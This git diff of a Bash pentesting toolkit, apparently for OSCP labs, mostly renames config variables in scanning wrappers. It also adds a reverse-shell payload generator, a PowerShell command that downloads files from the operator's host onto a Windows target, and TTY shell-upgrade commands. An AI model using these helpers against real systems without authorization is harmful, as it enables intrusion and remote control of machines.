@@ -22,11 +22,11 @@ function swiss() {
         logger info "|  ____/ /__ |/ |/ / __/ /  ____/ /____/ /   |"
         logger info "|  /____/ ____/|__/  /___/  /____/ /____/    |"
         logger info "|                                            |"
-        logger info "|  by @dextermallo v$APP_VERSION                    |"
+        logger info "|  by @dextermallo v$_swiss_app_version                    |"
         logger info "'--------------------------------------------'"
     }
 
-    if [ $APP_BANNER = true ]; then
+    if [ $_swiss_app_banner = true ]; then
         _banner
     fi
 
@@ -190,13 +190,12 @@ function svc() {
             logger info "[i] start ftp server on host"
             logger info "[i] usage:"
             logger info "[i] (1) run ftp"
-            i
-            logger info "[i] (2) run open <ip> 2121"
-            logger info "[i] (2-2) Default Interface ($DEFAULT_NETWORK_INTERFACE) IP: $(get_default_network_interface_ip)"
+            logger info "[i] (2) run open <ip> 21"
+            logger info "[i] (2-2) Default Interface ($_swiss_default_network_interface) IP: $(get_default_network_interface_ip)"
             logger info "[i] (3) use username anonymous"
             logger info "[i] (4) binary # use binary mode"
             logger info "[i] (5) put <file-you-want-to-download>"
-            python -m pyftpdlib -w
+            python3 -m pyftpdlib -w -p 21
             ;;
         http)
             logger info "[i] start http server"
@@ -337,7 +336,7 @@ function ship() {
         autoHost
 
     elif [[ "$type" == "windows" ]]; then
-        local cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile \$env:TEMP\\$filename\""
+        local cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
         logger info "[i] Windows type selected. wget command ready."
         logger info "[i] $cmd"
 
@@ -424,8 +423,8 @@ function ffuf_default() {
 
     _helper() {
         logger info "[i] Usage: ffuf_default [URL/FUZZ] (options)"
-        logger warn "[i] Recursive with depth = $FFUF_RECURSIVE_DEPTH"
-        logger warn "[i] Default wordlist: $FFUF_DEFAULT_WORDLIST"
+        logger warn "[i] Recursive with depth = $_swiss_ffuf_default_recursive_depth"
+        logger warn "[i] Default wordlist: $_swiss_ffuf_default_wordlist"
     }
 
     if [ $# -eq 0 ]; then
@@ -442,7 +441,25 @@ function ffuf_default() {
         local domain_dir="$(pwd)/ffuf/$domain"
         logger info "[i] Creating directory $domain_dir ..."
         mkdir -p "$domain_dir"
-        ffuf -w $FFUF_DEFAULT_WORDLIST -recursion -recursion-depth $FFUF_RECURSIVE_DEPTH -u ${@} | tee "$domain_dir/ffuf-default"
+
+        if [[ -f "$_swiss_ffuf_default_wordlist.statistic" ]]; then
+            logger warn "[w] ====== Wordlist Statistic ======"
+            _cat $_swiss_ffuf_default_wordlist.statistic
+            logger warn "[w] ================================"
+        fi
+
+        local stripped_url="${url/FUZZ/}"
+
+        if [ $_swiss_ffuf_default_use_dirsearch = true ]; then
+            if check_cmd_exist dirsearch; then
+                logger info "[i] (Extension) dirsearch quick scan"
+                dirsearch -u $stripped_url
+            else
+                logger error "[e] dirsearch is not installed"
+            fi
+        fi
+
+        ffuf -w $_swiss_ffuf_default_wordlist -recursion -recursion-depth $_swiss_ffuf_default_recursive_depth -u ${@} | tee "$domain_dir/ffuf-default"
     fi
 }
 
@@ -468,11 +485,13 @@ function ffuf_traversal_default() {
         logger info "[i] Creating directory $domain_dir ..."
         mkdir -p "$domain_dir"
 
-        if [[ -f "$FFUF_TRAVERSAL_DEFAULT_WORDLIST.statistic" ]]; then
-            _cat $FFUF_TRAVERSAL_DEFAULT_WORDLIST.statistic
+        if [[ -f "$_swiss_ffuf_traversal_default_wordlist.statistic" ]]; then
+            logger warn "[w] ====== Wordlist Statistic ======"
+            _cat $_swiss_ffuf_traversal_default_wordlist.statistic
+            logger warn "[w] ================================"
         fi
 
-        ffuf -w $FFUF_TRAVERSAL_DEFAULT_WORDLIST -u ${@} | tee "$domain_dir/traversal-default"
+        ffuf -w $_swiss_ffuf_traversal_default_wordlist -u ${@} | tee "$domain_dir/traversal-default"
     fi
 }
 
@@ -497,11 +516,13 @@ function gobuster_subdomain_default() {
         logger info "[i] Creating directory $domain_dir ..."
         mkdir -p "$domain_dir"
 
-        if [[ -f "$GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST.statistic" ]]; then
-            _cat $GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST.statistic
+        if [[ -f "$_swiss_gobuster_subdomain_default_wordlist.statistic" ]]; then
+            logger warn "[w] ====== Wordlist Statistic ======"
+            _cat $_swiss_gobuster_subdomain_default_wordlist.statistic
+            logger warn "[w] ================================"
         fi
 
-        gobuster dns -w $GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST -t 20 -o $domain_dir/subdomain-default -d ${@}
+        gobuster dns -w $_swiss_gobuster_subdomain_default_wordlist -t 20 -o $domain_dir/subdomain-default -d ${@}
     fi
 }
 
@@ -526,12 +547,14 @@ function gobuster_vhost_default() {
         logger info "[i] Creating directory $domain_dir ..."
         mkdir -p "$domain_dir"
 
-        if [[ -f "$GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST.statistic" ]]; then
-            _cat $GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST.statistic
+        if [[ -f "$_swiss_gobuster_vhost_default_wordlist.statistic" ]]; then
+            logger warn "[w] ====== Wordlist Statistic ======"
+            _cat $_swiss_gobuster_vhost_default_wordlist.statistic
+            logger warn "[w] ================================"
         fi
 
         gobuster vhost -k -u $ip --domain $domain --append-domain -r \
-                 -w $GOBUSTER_SUBDOMAIN_VHOST_DEFAULT_WORDLIST \
+                 -w $_swiss_gobuster_vhost_default_wordlist \
                  -o $domain_dir/vhost-default -t 64
     fi
 }
@@ -584,7 +607,7 @@ function get_web_pagelink() {
 # Usage: get_web_keywords <url>
 function get_web_keywords() {
     logger info "[i] Usage: get_web_keywords <url>"
-    cewl -d $CEWL_DEPTH -m $CEWL_MIN_WORD_LENGTH -w cewl-wordlist.txt $1
+    cewl -d $_swiss_get_web_keywords_depth -m $_swiss_get_web_keywords_min_word_length -w cewl-wordlist.txt $1
 }
 
 # Description: set the target IP address and set variable target
@@ -729,11 +752,11 @@ function go_workspace() {
 
 # Description:
 #   Spawn the new session in the workspace, and set target into the variables.
-#   The  function is configured by the environment variable SPAWN_SESSION_IN_WORKSPACE
+#   The  function is configured by the environment variable _swiss_spawn_session_in_workspace_start_at_new_session
 #   See settings.json for more details.
 # Usage: spawn_session_in_workspace
 function spawn_session_in_workspace() {
-    if [ "$SPAWN_SESSION_IN_WORKSPACE" = true ]; then
+    if [ "$_swiss_spawn_session_in_workspace_start_at_new_session" = true ]; then
         go_workspace
         target=$(g target)
     fi
@@ -861,7 +884,7 @@ function host_public_ip() {
 #   Show all utils in the utils directory with customized description.
 #   When a file has a corresponding markdown file with the same name under the same 
 #   directory, the description will be shown. (Only the first line of the markdown file)
-# Usage: show_utils [directory] (default: $HOME/oscp-swiss/utils)
+# Usage: list_utils [directory] (default: $HOME/oscp-swiss/utils)
 # Example:
 # you have a frequent-used reverse-shell under $HOME/oscp-swiss/utils/reverse-shell.php
 # and you have a description file $HOME/oscp-swiss/utils/reverse-shell.php.md
@@ -869,14 +892,27 @@ function host_public_ip() {
 # ```md
 # (make sure to change the IP and port before using it.)
 # ```
-# When you run show_utils, the description will be shown like:
+# When you run list_utils, the description will be shown like:
 #   /home/dex/oscp-swiss/utils
 #   ├── reverse-shell.php (make sure to change the IP and port before using it.)
 #   ├── ...
 #   └── other-utils
-function show_utils() {
-    # Check if a directory is provided; if not, use the current directory
-    local dir="${1:-$HOME/oscp-swiss/utils}"
+function list_utils() {
+    local default_dir="$HOME/oscp-swiss/utils"
+    local dir="$1"
+
+    if [[ -z "$dir" ]]; then
+        dir="$default_dir"
+    elif [[ "$dir" == /* ]]; then
+        dir="$dir"
+    else
+        dir="$default_dir/$dir"
+    fi
+
+    if [[ ! -d "$dir" ]]; then
+        logger error "[e] path does not exist"
+        return 1
+    fi
 
     tree -C "$dir" -L 1 | while read -r line; do
         # Extract the file name from the tree output by ignoring color codes
@@ -888,29 +924,182 @@ function show_utils() {
             desc=$(head -n 1 "$desc_file")
             echo -e "$line \033[33m$desc\033[0m"
         else
-            echo "$line"
+            if [[ "$filename" != *.md ]]; then
+                echo "$line"
+            fi
         fi
     done
 }
 
 # Description:
-#   Combo of show_utils. This will show a file's description if it has a corresponding markdown file.
+#   Combo of list_utils. This will show a file's description if it has a corresponding markdown file.
 # Usage: explain <file_or_directory>
 function explain() {
-    if [[ -z "$1" ]]; then
-        echo "Usage: explain <file_or_directory>"
-        return 1
+    local file="$1"
+
+    if [[ "file" != /* ]]; then
+        file="$HOME/oscp-swiss/utils/$file"
     fi
 
-    local target="$1"
+    if [[ -z "$file" ]]; then
+        logger info "Usage: explain <file_or_directory>"
+        return 1
+    fi
     
-    local desc_file="${target}.md"
+    local desc_file="${file}.md"
     
     if [[ -f "$desc_file" ]]; then
         cat "$desc_file"
     else
-        echo "No description file found for $target."
+        logger warn "No description file found for $file."
     fi
+}
+
+# TODO: Doc
+function make_variable() {
+    local file_path="$1"
+    local name="$2"
+
+    if [ ! -f "$file_path" ]; then
+        logger warn "The file path $file_path does not exist."
+        return 1
+    fi
+
+    if [[ "$file_path" != /* ]]; then
+        file_path="$(realpath "$file_path")"
+    fi
+
+    file_path="${file_path/#$HOME/\$HOME}"
+
+    local alias_file="$HOME/oscp-swiss/script/alias.sh"
+    touch "$alias_file"
+
+    if [ -n "$(tail -c 1 "$alias_file")" ]; then
+        echo >> "$alias_file"
+    fi
+
+    echo "$name='$file_path'" >> "$alias_file"
+    logger info "[i] Variable $name for $file_path has been added."
+}
+
+# TODO: Doc
+function cheatsheet() {
+
+    _helper() {
+        logger info "[i] Usage cheatsheet <cheatsheet name>"
+        logger info "[i] Current cheatsheet: <tty>"
+    }
+
+    local cheatsheet=""
+    case "$1" in
+            tty)
+                output="$2"
+                cat <<'EOF'
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+(inside the nc session) CTRL+Z;
+
+# stty -a to get rows and cols
+stty raw -echo; fg;
+
+clear;export SHELL=/bin/bash;export TERM=xterm-256color;stty rows 60 columns 160;reset
+
+# color-ref: https://ivanitlearning.wordpress.com/2020/03/25/adding-colour-to-linux-tty-shells/
+# only works in bash. if facing Garbled, try go into bash 
+export LS_OPTIONS='--color=auto'; eval "`dircolors`"; alias ls='ls $LS_OPTIONS'; export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\] '
+
+# If facing garbled, use:
+PS1="# "
+EOF
+                ;;
+            *)
+                _helper
+                return 1
+                ;;
+        esac    
+}
+
+# Usage: rev_shell
+# TODO: Doc
+# TODO: built-in encode
+# TODO: env default port
+function rev_shell() {
+    logger info "[i] Enter IP (Default: $(get_default_network_interface_ip)): \c"
+    read -r IP
+    local IP=${IP:-$(get_default_network_interface_ip)}
+
+    logger info "[i] Port (Default: 9000): \c"
+    read -r PORT
+    local PORT=${PORT:-9000}
+
+    local -a allowed_shell_types=("sh" "/bin/sh" "bash" "/bin/bash" "cmd" "powershell" "pwsh" "ash" "bsh" "csh" "ksh" "zsh" "pdksh" "tcsh" "mksh" "dash")
+
+    function is_valid_shell_type() {
+        local shell="$1"
+        for valid_shell in "${allowed_shell_types[@]}"; do
+            if [[ "$shell" == "$valid_shell" ]]; then
+                return 0
+            fi
+        done
+        return 1
+    }
+
+    while true; do
+        logger info "[i] Enter Shell (Default: /bin/bash): \c"
+        read -r SHELL_TYPE
+        SHELL_TYPE=${SHELL_TYPE:-"/bin/bash"}
+
+        if is_valid_shell_type "$SHELL_TYPE"; then
+            break
+        else
+            logger error "[e] Invalid SHELL_TYPE. Allowed values are: ${allowed_shell_types[*]}"
+        fi
+    done
+
+    # stripping color
+    logger info ""
+
+    local PS3="Please select the Mode (number): "
+    local -a bash_options=( "Bash -i" "Bash 196" "Bash read line" "Bash 5" "Bash udp" "nc mkfifo" "nc -e" "nc.exe -e" "BusyBox nc -e" "nc -c" "ncat -e" "ncat.exe -e" "ncat udp" "curl" "rustcat" "C" "C Windows" "C# TCP Client" "C# Bash -i" "Haskell #1" "OpenSSL" "Perl" "Perl no sh" "Perl PentestMonkey" "PHP PentestMonkey" "PHP Ivan Sincek" "PHP cmd" "PHP cmd 2" "PHP cmd small" "PHP exec" "PHP shell_exec" "PHP system" "PHP passthru" "PHP \`" "PHP popen" "PHP proc_open" "Windows ConPty" "PowerShell #1" "PowerShell #2" "PowerShell #3" "PowerShell #4 (TLS)" "PowerShell #3 (Base64)" "Python #1" "Python #2" "Python3 #1" "Python3 #2" "Python3 Windows" "Python3 shortest" "Ruby #1" "Ruby no sh" "socat #1" "socat #2 (TTY)" "sqlite3 nc mkfifo" "node.js" "node.js #2" "Java #1" "Java #2" "Java #3" "Java Web" "Java Two Way" "Javascript" "Groovy" "telnet" "zsh" "Lua #1" "Lua #2" "Golang" "Vlang" "Awk" "Dart" "Crystal (system)" "Crystal (code)")
+
+    local MODE
+    select MODE in "${bash_options[@]}"; do
+      if [[ -n "$MODE" ]]; then
+        logger info "\n[i] Mode $MODE selected."
+        local ENCODED_MODE=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$MODE'''))")
+        break
+      else
+        logger error "[e] Invalid selection, please try again."
+      fi
+    done
+
+    local ENCODED_SHELL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$SHELL_TYPE'''))")
+    local URL="https://www.revshells.com/${ENCODED_MODE}?ip=${IP}&port=${PORT}&shell=${ENCODED_SHELL}"
+    local HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${URL}")
+
+    if [[ "$HTTP_STATUS" -eq 200 ]]; then
+        curl -s "${URL}" | xclip -selection clipboard
+        logger info "[i] payload copied."
+    else
+        logger error "[e] Status $HTTP_STATUS"
+    fi
+}
+
+# TODO: Doc
+function url_encode() {
+    local string="${1}"
+    printf '%s' "${string}" | jq -sRr @uri
+}
+
+# TODO: DOc
+function url_decode() {
+    local string="${1//+/ }"
+    printf '%s' "$string" | perl -MURI::Escape -ne 'print uri_unescape($_)'
+}
+
+function msfsearch() {
+    msfconsole -q -x "search $@; exit"
 }
 
 spawn_session_in_workspace
